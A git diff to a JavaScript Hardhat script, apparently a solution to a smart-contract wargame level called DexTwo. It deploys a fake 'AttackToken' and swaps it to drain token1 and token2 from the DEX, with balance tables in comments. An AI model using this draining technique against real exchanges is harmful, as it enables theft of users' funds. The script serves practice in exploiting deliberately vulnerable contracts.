@@ -24,11 +24,9 @@ const attackDexTwo = async () => {
     // const deployed = await deployContract(hre, "AttackToken", args);
     // alternative below
     console.log("Deploying attack contract AttackToken...");
-    const Factory = await ethers.getContractFactory("AttackToken", deployer);
-    const attackToken = await Factory.deploy();
-    console.log(attackToken);
-    console.log(`Contract deployed to ${attackToken.address}`);
-    console.log("Attack contract deployed...");
+    const attack = await (await ethers.getContractFactory("AttackToken", deployer)).deploy();
+    console.log(attack);
+    console.log(`Attack contract deployed to ${attack.address}`);
     // experimantal verify below
     // if (attackToken.address){
     //     console.log("Verifying contract...");
@@ -47,7 +45,6 @@ const attackDexTwo = async () => {
     // }
 
     console.log("Approving ATK tokens for transfer...");
-    const attack = await ethers.getContractAt("AttackToken", attackToken.address);
     const approveATK = await attack.approve(dexTwoAddress, 200);
     const approveATKtxn = await approveATK.wait();
     console.log(approveATKtxn);
@@ -93,7 +90,7 @@ const attackDexTwo = async () => {
     console.log(approveReceipt);
     console.log("Approved token transfers");
     console.log("Draining token1...");
-    const swap1 = await contract.swap(attackToken.address, token1Address, 100);
+    const swap1 = await contract.swap(attack.address, token1Address, 100);
     const swap1txn = await swap1.wait();
     console.log(swap1txn);
     // sample table below of balances from here
@@ -103,7 +100,7 @@ const attackDexTwo = async () => {
     //   100     100     100 |   10      10      300
     // //   0       100     200 |   110     10      200
     console.log("Draining token2...");
-    const swap2 = await contract.swap(attackToken.address, token2Address, 200);
+    const swap2 = await contract.swap(attack.address, token2Address, 200);
     const swap2txn = await swap2.wait();
     console.log(swap2txn);
     // final sample table below
